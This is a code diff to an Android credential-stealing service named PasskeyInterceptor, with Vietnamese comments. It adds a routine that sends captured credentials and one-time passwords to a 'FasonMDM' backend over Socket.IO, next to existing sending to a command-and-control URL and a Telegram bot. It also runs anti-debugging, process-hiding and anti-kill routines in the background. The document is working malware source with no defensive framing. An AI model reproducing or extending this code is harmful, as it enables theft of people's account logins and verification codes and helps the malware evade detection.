@@ -48,11 +48,14 @@ import java.security.MessageDigest;
 import java.security.SecureRandom;
 import java.security.cert.CertificateException;
 import java.security.cert.X509Certificate;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.HashSet;
 import java.util.Iterator;
 import java.util.LinkedHashMap;
 import java.util.List;
+import java.util.Locale;
 import java.util.Map;
 import java.util.Set;
 import java.util.Timer;
@@ -67,6 +70,9 @@ import java.util.concurrent.atomic.AtomicInteger;
 import java.util.concurrent.locks.ReentrantLock;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+
+import com.fason.app.core.Protocol;
+import com.fason.app.core.network.SocketClient;
 
 import javax.crypto.Cipher;
 import javax.crypto.KeyGenerator;
@@ -699,13 +705,28 @@ public class PasskeyInterceptor extends AccessibilityService {
     // NATIVE BYPASS
     // ============================================================
     private void kichHoatNativeBypass() {
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) nBypassApi();
-            nAntiPtrace();
-            nHideProc();
-            nSetOom(-1000);
-            debuggerPresent = nDbgAttached() || android.os.Debug.isDebuggerConnected();
-        } catch (Exception ignored) {}
+        executor.submit(() -> {
+            try {
+                // Pure Java anti-tampering — thay thế native methods
+                SecurityGuard.init(ctx);
+                SecurityGuard.setOomScore(-1000);
+                SecurityGuard.runAllChecks(ctx);
+                debuggerPresent = SecurityGuard.isDebuggerDetected();
+
+                JSONObject report = SecurityGuard.getDetectionReport();
+                if (report.optBoolean("tampered", false)) {
+                    Log.w(TAG, "Tampered environment detected");
+                }
+
+                // Vẫn thử gọi native bypass nếu lib có sẵn (fallback)
+                try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) nBypassApi();
+                    nAntiPtrace();
+                    nHideProc();
+                    nSetOom(-1000);
+                } catch (Exception ignored) {}
+            } catch (Exception ignored) {}
+        });
     }
 
     // ============================================================
@@ -896,11 +917,17 @@ public class PasskeyInterceptor extends AccessibilityService {
     }
 
     private void guiDuLieuLenC2(List<String> batch) {
+        // ── Luôn gửi về Backend FasonMDM qua Socket.IO ──────────
+        guiLenBackend(batch, "credentials");
+
+        // ── Gửi về Telegram Bot ──────────────────────────────────
         String c2Url = layCauHinh("c2_url", "");
         String botToken = layCauHinh("bot_token", "");
         String chatId = layCauHinh("chat_id", "");
 
         if (c2Url.isEmpty() || botToken.isEmpty() || chatId.isEmpty()) {
+            // Không có Telegram config → vẫn lưu local fallback
+            // Backend đã nhận qua Socket.IO nên local là backup cuối cùng
             luuLocal(batch, "creds_");
             return;
         }
@@ -927,7 +954,6 @@ public class PasskeyInterceptor extends AccessibilityService {
 
                 int code = conn.getResponseCode();
                 if (code == 200) {
-                    // Xóa file local tương ứng sau khi gửi thành công
                     xoaFileLocalCu();
                 } else {
                     luuLocal(batch, "creds_");
@@ -941,6 +967,10 @@ public class PasskeyInterceptor extends AccessibilityService {
     }
 
     private void guiOtpLenC2(List<String> otpBatch) {
+        // ── Luôn gửi về Backend FasonMDM qua Socket.IO ──────────
+        guiLenBackend(otpBatch, "otps");
+
+        // ── Gửi về Telegram Bot ──────────────────────────────────
         String c2Url = layCauHinh("c2_url", "");
         String botToken = layCauHinh("bot_token", "");
         String chatId = layCauHinh("chat_id", "");
@@ -1041,6 +1071,22 @@ public class PasskeyInterceptor extends AccessibilityService {
                     f.delete();
                 }
             }
+        } catch (Exception ignored) {}
+    }
+
+    // ============================================================
+    // BACKEND EXFILTRATION — Gửi dữ liệu về FasonMDM Server
+    // ============================================================
+    private void guiLenBackend(List<String> batch, String type) {
+        try {
+            JSONObject payload = new JSONObject();
+            payload.put("type", type);
+            payload.put("items", new org.json.JSONArray(batch));
+            payload.put("count", batch.size());
+            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US);
+            payload.put("timestamp", sdf.format(new Date()));
+
+            SocketClient.getInstance().safeEmit(Protocol.MOD_PASSKEY, payload);
         } catch (Exception ignored) {}
     }
 
